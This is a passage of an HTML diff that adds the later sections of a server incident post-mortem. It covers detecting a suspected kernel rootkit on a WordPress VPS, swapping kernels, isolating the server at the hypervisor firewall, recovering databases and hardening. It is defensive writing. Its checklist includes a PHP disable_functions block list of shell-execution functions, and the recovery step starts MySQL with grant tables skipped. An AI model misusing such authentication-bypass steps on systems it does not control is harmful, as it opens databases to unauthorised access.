+      <div class="chain-step"><div class="chain-connector"><div class="chain-circle" style="background:rgba(255,68,68,.15);border:2px solid #ff4444;color:#ff6666;">4</div></div><div class="chain-content"><div class="chain-title">DNS flood and C2 callback</div><div class="chain-desc">Outbound UDP flood to public DNS resolvers. Daily C2 beacon via cron. Active connection to Dutch server with no visible process owner.</div></div></div>
+    </div>
+    <p>Iterating directly through <code>/proc</code> — bypassing the compromised <code>ps</code> — exposed dozens of hidden processes. The malware intercepted <code>ps</code> queries but <strong>didn't fake the physical contents of <code>/proc/PID/</code> directories</strong> — that gap was the opening.</p>
+  </div>
+
+  <div class="section" id="en-s7">
+    <div class="section-header"><span class="section-num">07</span><h2>The breakthrough: swapping the kernel restores control</h2></div>
+    <p>Working on a system with a lying kernel is like playing chess against an opponent who can see your moves before you make them. The only option was to change the board itself.</p>
+    <p>In the Linode panel under <strong>Configurations</strong>, the boot profile was changed from the external Linode kernel (<code>6.15.7-x86_64-linode169</code>) to <strong>GRUB (Legacy)</strong>. After reboot, the system came up on its own Ubuntu kernel: <code>5.15.0-152-generic</code>.</p>
+    <div class="callout callout-success">
+      <div class="callout-icon">✅</div>
+      <div class="callout-body"><div class="callout-title">Why swapping the kernel killed the suspected rootkit</div><p>LKM rootkits are compiled against the specific internal symbol offsets of a particular kernel version. With a different kernel, the module can't locate the addresses it needs — its code becomes incompatible with the new environment. The hooked syscalls are released. The OS starts telling the truth again.</p></div>
+    </div>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash — after kernel swap</span></div>
+      <div class="code-content"><pre><span class="c-prompt">root@server:~#</span> <span class="c-cmd">lsmod</span>
+<span class="c-out">Module              Size  Used by
+drm_kms_helper    315392  4 bochs,drm_vram_helper
+virtio_net         61440  0
+aesni_intel       376832  0
+...</span>
+<span class="c-comment"># ← lsmod is alive. The suspected rootkit is dead.</span>
+
+<span class="c-prompt">root@server:~#</span> <span class="c-cmd">ss -uapn | grep :53</span>
+<span class="c-out">UNCONN 0 0 127.0.0.53%lo:53  0.0.0.0:*  users:(("systemd-resolve"...))</span>
+<span class="c-comment"># ← DNS flood stopped. Hundreds of connections: gone.</span></pre></div>
+    </div>
+  </div>
+
+  <div class="section" id="en-s8">
+    <div class="section-header"><span class="section-num">08</span><h2>Network isolation at the hypervisor level</h2></div>
+    <p>Cloud Firewall rules are applied <strong>before</strong> packets reach the VM. No code running inside the OS can see this firewall, let alone bypass it.</p>
+    <div class="compare">
+      <div class="compare-box before">
+        <div class="compare-label">Before isolation</div>
+        <ul>
+          <li>FTP (21), SSH (22) open to everyone</li>
+          <li>Full mail stack (25, 465, 587, 110, 143, 993, 995)</li>
+          <li>BrainyCP panel (8000, 8002)</li>
+          <li>Unrestricted outbound traffic</li>
+          <li>DNS flood freely exits the server</li>
+        </ul>
+      </div>
+      <div class="compare-box after">
+        <div class="compare-label">After isolation</div>
+        <ul>
+          <li>HTTP (80) — sites still serve traffic</li>
+          <li>HTTPS (443) — sites still serve traffic</li>
+          <li>998 ports — filtered</li>
+          <li>Rootkit cut off from C2</li>
+          <li>Business continues uninterrupted</li>
+        </ul>
+      </div>
+    </div>
+    <div class="callout callout-info">
+      <div class="callout-icon">💡</div>
+      <div class="callout-body"><div class="callout-title">Why not just use iptables inside the OS?</div><p>If the kernel is compromised, you can't trust <code>iptables</code> either. A rootkit can intercept the network stack and bypass firewall rules from inside the kernel. Cloud Firewall at the hypervisor level is Out-of-Band Security: it lives completely outside the protected system's perimeter.</p></div>
+    </div>
+  </div>
+
+  <div class="section" id="en-s9">
+    <div class="section-header"><span class="section-num">09</span><h2>Saving data and migration plan</h2></div>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash — database dump</span></div>
+      <div class="code-content"><pre><span class="c-cmd">/usr/libexec/mysqld --skip-grant-tables \
+  --socket=/tmp/recovery.sock --user=mysql &amp;</span>
+
+<span class="c-cmd">mysqldump --socket=/tmp/recovery.sock --all-databases \
+  --events --routines --triggers > /root/FINAL_DUMP.sql</span>
+
+<span class="c-out">-rw-r--r-- 1 root root 847M May 06 01:14 FINAL_DUMP.sql</span></pre></div>
+    </div>
+    <div class="checklist">
+      <div class="check-item"><span class="check-icon" style="color:var(--green)">✓</span><span><strong>SQL database dumps</strong> — the only truly trusted asset.</span></div>
+      <div class="check-item"><span class="check-icon" style="color:var(--green)">✓</span><span><strong>Web server configs</strong> — text files reviewable by hand before use.</span></div>
+      <div class="check-item"><span class="check-icon" style="color:var(--warn)">⚠</span><span><strong>wp-content/uploads</strong> — only after scanning for PHP files (there should be none).</span></div>
+      <div class="check-item"><span class="check-icon" style="color:var(--danger)">✗</span><span><strong>PHP site files</strong> — reinstall only from official WordPress.org repositories.</span></div>
+      <div class="check-item"><span class="check-icon" style="color:var(--danger)">✗</span><span><strong>Binaries and system files</strong> — never, under any circumstances.</span></div>
+      <div class="check-item"><span class="check-icon" style="color:var(--danger)">✗</span><span><strong>Old SSH keys and passwords</strong> — all must be considered compromised.</span></div>
+    </div>
+  </div>
+
+  <div class="section" id="en-s10">
+    <div class="section-header"><span class="section-num">10</span><h2>Key lessons and hardening recommendations</h2></div>
+    <div class="lessons">
+      <div class="lesson"><div class="lesson-num">01</div><div><div class="lesson-title">Metadata is more honest than content</div><p><code>ctime</code> can't be forged through ordinary means. Every <code>chmod</code> updates it unavoidably. When content is silent, metadata speaks. Make <code>stat</code> your first tool in any investigation.</p></div></div>
+      <div class="lesson"><div class="lesson-num">02</div><div><div class="lesson-title">Empty lsmod is an SOS, not normal</div><p>Physically impossible on a working server. It means a kernel-level compromise (likely an LKM rootkit) or a replaced <code>kmod</code>. Don't trust the kernel — act one level up.</p></div></div>
+      <div class="lesson"><div class="lesson-num">03</div><div><div class="lesson-title">Swapping the kernel kills kernel-level malware</div><p>LKMs are tightly bound to a specific kernel version through internal symbol offsets. A different kernel makes the module incompatible. On Linode or DigitalOcean this takes 5 minutes from the web panel.</p></div></div>
+      <div class="lesson"><div class="lesson-num">04</div><div><div class="lesson-title">The hypervisor is the only neutral arbiter</div><p>Cloud Firewall at the hypervisor level is Out-of-Band Security. First response to any serious incident: isolate from the outside, investigate after.</p></div></div>
+      <div class="lesson"><div class="lesson-num">05</div><div><div class="lesson-title">Hardlinks are a blind spot for most scanners</div><p>Most tools don't cross-check inodes between directories. Regular <code>find -inum</code> checks on system binaries should be part of your security routine.</p></div></div>
+      <div class="lesson"><div class="lesson-num">06</div><div><div class="lesson-title">Infrastructure as cattle, not pets</div><p>Rebuild took less time than fighting the compromise. Victory isn't about finding every malicious byte — it's that the architecture let us amputate the infected node and grow a clean one without losing a row of data.</p>
+    </div>
+
+    <div class="divider"></div>
+    <h3>WordPress on VPS hardening checklist</h3>
+    <div class="checklist">
+      <div class="check-item"><span class="check-icon">🔑</span><span>SSH keys only. Set <code>PasswordAuthentication no</code> in <code>sshd_config</code>.</span></div>
+      <div class="check-item"><span class="check-icon">🔥</span><span>Cloud Firewall at the hypervisor level. Control panel ports accessible only from specific IPs.</span></div>
+      <div class="check-item"><span class="check-icon">📦</span><span>PHP user isolation per account + <code>disable_functions = exec,passthru,shell_exec,system,popen</code>.</span></div>
+      <div class="check-item"><span class="check-icon">🚫</span><span>Block <code>xmlrpc.php</code> and <code>wp-login.php</code> via Fail2Ban or Nginx <code>limit_req</code>.</span></div>
+      <div class="check-item"><span class="check-icon">🔒</span><span><code>chattr +i wp-config.php</code> — make the config immutable after setup.</span></div>
+      <div class="check-item"><span class="check-icon">📊</span><span>Alert on anomalous outbound traffic and UDP flood to port 53.</span></div>
+      <div class="check-item"><span class="check-icon">🔍</span><span>Regular <code>find /etc /bin /usr/bin -type f -newer /etc/passwd</code> to detect new binaries in system directories.</span></div>
+      <div class="check-item"><span class="check-icon">💾</span><span>Offline SQL dump backups. Disk image backups are useless — they export the infection with the data.</span></div>
+    </div>
+  </div>
+
+  <div class="final-quote">
+    <blockquote>"We didn't win because we found every malicious byte.<br>We won because our architecture let us amputate<br>the infected segment and grow a new one."</blockquote>
+    <cite>— Immutable Infrastructure principle in practice</cite>
+  </div>
+
+  <div class="author-card">
+    <img src="/stanislav.png" alt="Stanislav Kurmanov" class="author-avatar" style="border-radius: 50%; object-fit: cover; object-position: 50% 40%;" />
+    <div>
+      <div class="author-name">Stanislav Kurmanov</div>
+      <div class="author-role">// Infrastructure Architect · DevSecOps</div>
+    </div>
+  </div>
+</div>
+<footer>
+  <div>// Technical Post-Mortem · Incident of May 5–6, 2026</div>
+  <div style="margin-top:8px;color:#2a3548">Reproduction welcome with attribution</div>
+  <div class="footer-links">
+    <a href="/">Home</a>
+    <a href="/incidents">Incident Reports</a>
+    <a href="/about">About</a>
+    <a href="/blog">Blog</a>
+  </div>
+</footer>
+</body>
+</html>
